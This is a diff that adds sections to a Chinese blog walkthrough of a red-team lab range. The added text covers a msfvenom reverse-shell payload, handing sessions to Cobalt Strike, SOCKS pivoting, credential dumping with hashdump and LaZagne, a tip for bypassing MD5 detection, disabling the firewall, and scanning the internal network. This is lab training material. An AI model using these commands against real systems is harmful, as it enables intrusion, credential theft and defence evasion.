@@ -165,6 +165,84 @@
 <h3 id="CS利用"><a href="#CS利用" class="headerlink" title="CS利用"></a>CS利用</h3><p>要获得<code>CS</code>的<code>beacon</code>，可以生成<strong>木马文件</strong>回弹<code>beacon</code>，也可以将MSF的<code>meterpreter</code>派生给<code>CS</code></p>
 <h4 id="MSF派生给CS"><a href="#MSF派生给CS" class="headerlink" title="MSF派生给CS"></a>MSF派生给CS</h4><p>执行<code>background</code>将会话放到后台，切换payload</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt;  use exploit/windows/<span class="built_in">local</span>/payload_inject</span><br><span class="line">msf exploit(payload_inject) &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_http</span><br><span class="line">msf exploit(payload_inject) &gt; <span class="built_in">set</span> DisablePayloadHandler <span class="literal">true</span></span><br><span class="line">msf exploit(payload_inject) &gt; <span class="built_in">set</span> LHOST [Listener监听IP]</span><br><span class="line">msf exploit(payload_inject) &gt; <span class="built_in">set</span> LPORT [Listener监听端口]</span><br><span class="line">msf exploit(payload_inject) &gt; <span class="built_in">set</span> SESSION [session ID]</span><br><span class="line">msf exploit(payload_inject) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321101639.png" alt></p>
+<p>可能是<code>php-meterpreter</code>的会话与该模块不匹配。</p>
+<p>试下Windows下的<code>PE文件</code>的<code>meterpreter</code>：</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.91.130 LPORT=8765 -f exe&gt;shell.exe</code></p>
+<p><strong>MSF监听模块</strong></p>
+<p>蚁剑的虚拟终端执行：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321102835.png" alt></p>
+<p>收到meterpreter：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321103003.png" alt></p>
+<p>这是两个不同类型的<code>meterpreter-shell</code>：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321103046.png" alt></p>
+<p>再尝试上述派生给CS（CS的<code>Listener</code>选择<code>windows/beacon_http/reverse_http</code>）：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321103520.png" alt></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321103649.png" alt></p>
+<p>关于<code>meterpreter php/windows</code>，没有找到可派生的对应的模块。。</p>
+<p>同理，CS的<code>beacon</code>也可以派生给<code>MSF</code>：<a href="https://xz.aliyun.com/t/6722" target="_blank" rel="noopener">https://xz.aliyun.com/t/6722</a></p>
+<h2 id="CS与MSF联动"><a href="#CS与MSF联动" class="headerlink" title="CS与MSF联动"></a>CS与MSF联动</h2><p>通过CS拿到一个beacon后，通过beacon内置的socks功能在VPS上开启代理端口，将本地的MSF直接带入目标内网。</p>
+<p>Beacon下开启socks 端口     // 开启socks代理</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321105359.png" alt></p>
+<p>View -&gt; Proxy Pivots        // 复制代理链接到MSF中</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321105503.png" alt></p>
+<p>msf5 &gt; setg Proxies socks4:192.168.91.130:7890     // 让msf所有模块的流量都通过此代理走。(setg全局设置)</p>
+<p>msf5 &gt; setg ReverseAllowProxy true #允许反向代理，通过socks反弹shell，建立双向通道。</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321105650.png" alt></p>
+<p>其他操作看不太懂。。</p>
+<h2 id="主机密码收集"><a href="#主机密码收集" class="headerlink" title="主机密码收集"></a>主机密码收集</h2><h3 id="CS中使用hashdump和logonpasswords"><a href="#CS中使用hashdump和logonpasswords" class="headerlink" title="CS中使用hashdump和logonpasswords"></a>CS中使用<code>hashdump</code>和<code>logonpasswords</code></h3><p>执行完上述两条命令后，在<code>view -&gt; Credentials</code>下查看</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321111431.png" alt></p>
+<h3 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h3><p><a href="https://github.com/AlessandroZ/LaZagne/releases" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne/releases</a></p>
+<p>用于查找本地存储的所有密码，将exe文件上传到目标主机上再执行</p>
+<p><strong>推荐在meterpreter下执行shell，再执行该文件。</strong>beacon的交互shell也挺好，蚁剑的虚拟终端没有回显。</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321113451.png" alt></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321113519.png" alt></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321113549.png" alt></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321113605.png" alt></p>
+<h2 id="内网搜集"><a href="#内网搜集" class="headerlink" title="内网搜集"></a>内网搜集</h2><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><h4 id="1-补丁信息"><a href="#1-补丁信息" class="headerlink" title="1. 补丁信息"></a>1. 补丁信息</h4><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321114232.png" alt></p>
+<p><strong>踩坑</strong>：之前执行这个exe木马文件时，是在蚁剑下执行的，实际上是apache上的一个进程，当执行上面查看补丁的命令时，会失败：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321114523.png" alt></p>
+<p>我们可以迁移一下进程再执行（不一定成功）。</p>
+<h4 id="2-安装软件信息"><a href="#2-安装软件信息" class="headerlink" title="2. 安装软件信息"></a>2. 安装软件信息</h4><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321115643.png" alt></p>
+<p>发现有nmap，可以直接利用nmap对内网<code>192.168.52.*</code>网段进行扫描</p>
+<p>python可以对<code>LaZagne-master</code>项目上传python脚本到目标主机上，再对其进行打包成exe从而<strong>绕过MD5检测</strong>等</p>
+<h4 id="3-查看路由信息"><a href="#3-查看路由信息" class="headerlink" title="3. 查看路由信息"></a>3. 查看路由信息</h4><p>添加路由到目标环境网络，使得MSF能够通过Win7路由转发访问192.168.52.0网段</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321120205.png" alt></p>
+<p>添加成功：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321120322.png" alt></p>
+<h4 id="4-arp扫描52网段"><a href="#4-arp扫描52网段" class="headerlink" title="4. arp扫描52网段"></a>4. arp扫描52网段</h4><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321120622.png" alt></p>
+<h4 id="5-nmap扫描主机（先关闭防火墙）"><a href="#5-nmap扫描主机（先关闭防火墙）" class="headerlink" title="5. nmap扫描主机（先关闭防火墙）"></a>5. nmap扫描主机（先关闭防火墙）</h4><ul>
+<li><code>-sS</code>：TCP SYN scans</li>
+<li><code>-sV</code>：探索开放的端口、确定服务/版本信息</li>
+<li><code>-O</code>：探测操作系统信息</li>
+</ul>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321134619.png" alt></p>
+<p><strong>尝试关闭防火墙</strong>：</p>
+<ul>
+<li><code>shell</code> -&gt; <code>netsh advfirewall set allprofiles state off</code></li>
+</ul>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321142410.png" alt></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321142620.png" alt></p>
+<p>需要管理员权限，<strong>先本地提权</strong>。</p>
+<ul>
+<li><code>meterpreter &gt;  run post/windows/manage/enable_rdp</code> 远程桌面服务防火墙</li>
+</ul>
+<p>再用<code>nmap</code>扫描一下：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321143027.png" alt></p>
+<p>使用nmap的<code>vuln</code>脚本扫描：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321143352.png" alt></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321143420.png" alt></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321143450.png" alt></p>
+<p>很多漏洞可以直接使用msf利用。</p>
+<h4 id="6-nmap扫描内网主机"><a href="#6-nmap扫描内网主机" class="headerlink" title="6. nmap扫描内网主机"></a>6. nmap扫描内网主机</h4><p>先添加路由，再扫描。这个靶机中安装了nmap，也可以直接使用它的进行探测。</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321144354.png" alt></p>
+<p>使用靶机自己安装的nmap进行扫描，结果不一样。。<strong>可能是防火墙的缘故</strong>，带来点思考。。</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321145214.png" alt></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321145251.png" alt></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321144640.png" alt></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321145736.png" alt></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200321145814.png" alt></p>
+<h2 id="内网攻击"><a href="#内网攻击" class="headerlink" title="内网攻击"></a>内网攻击</h2><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4NjEyMDk0MA==&amp;mid=2649849539&amp;idx=1&amp;sn=c7c739a8494d79cf5cfcfe613b6b193d&amp;chksm=f3e41040c493995666ae142800969365be4aadde55e6ca2df8e74185c4973da26217aaf58c23&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">ATT&amp;CK实战 | 红队评估一(上)</a></p>
   </article>
   <aside class="table-content" id="site-toc">
   <div class="table-content-title">
@@ -172,7 +250,7 @@
     <span>目录</span>
   </div>
   <div class="table-content-main">
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#网络拓扑图"><span class="toc-text">网络拓扑图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#靶机网卡及IP"><span class="toc-text">靶机网卡及IP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-text">getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF监听，反弹php-meterpreter"><span class="toc-text">MSF监听，反弹php-meterpreter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#免杀payload"><span class="toc-text">免杀payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF提权"><span class="toc-text">MSF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UAC提权"><span class="toc-text">UAC提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MS系列未修补的漏洞进行提权"><span class="toc-text">MS系列未修补的漏洞进行提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#通过假冒令牌提权"><span class="toc-text">通过假冒令牌提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CS利用"><span class="toc-text">CS利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF派生给CS"><span class="toc-text">MSF派生给CS</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#网络拓扑图"><span class="toc-text">网络拓扑图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#靶机网卡及IP"><span class="toc-text">靶机网卡及IP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-text">getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF监听，反弹php-meterpreter"><span class="toc-text">MSF监听，反弹php-meterpreter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#免杀payload"><span class="toc-text">免杀payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF提权"><span class="toc-text">MSF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UAC提权"><span class="toc-text">UAC提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MS系列未修补的漏洞进行提权"><span class="toc-text">MS系列未修补的漏洞进行提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#通过假冒令牌提权"><span class="toc-text">通过假冒令牌提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CS利用"><span class="toc-text">CS利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF派生给CS"><span class="toc-text">MSF派生给CS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CS与MSF联动"><span class="toc-text">CS与MSF联动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#主机密码收集"><span class="toc-text">主机密码收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CS中使用hashdump和logonpasswords"><span class="toc-text">CS中使用hashdump和logonpasswords</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LaZagne"><span class="toc-text">LaZagne</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网搜集"><span class="toc-text">内网搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#内网信息收集"><span class="toc-text">内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-补丁信息"><span class="toc-text">1. 补丁信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-安装软件信息"><span class="toc-text">2. 安装软件信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-查看路由信息"><span class="toc-text">3. 查看路由信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-arp扫描52网段"><span class="toc-text">4. arp扫描52网段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-nmap扫描主机（先关闭防火墙）"><span class="toc-text">5. nmap扫描主机（先关闭防火墙）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-nmap扫描内网主机"><span class="toc-text">6. nmap扫描内网主机</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网攻击"><span class="toc-text">内网攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
   </div>
 </aside>
   
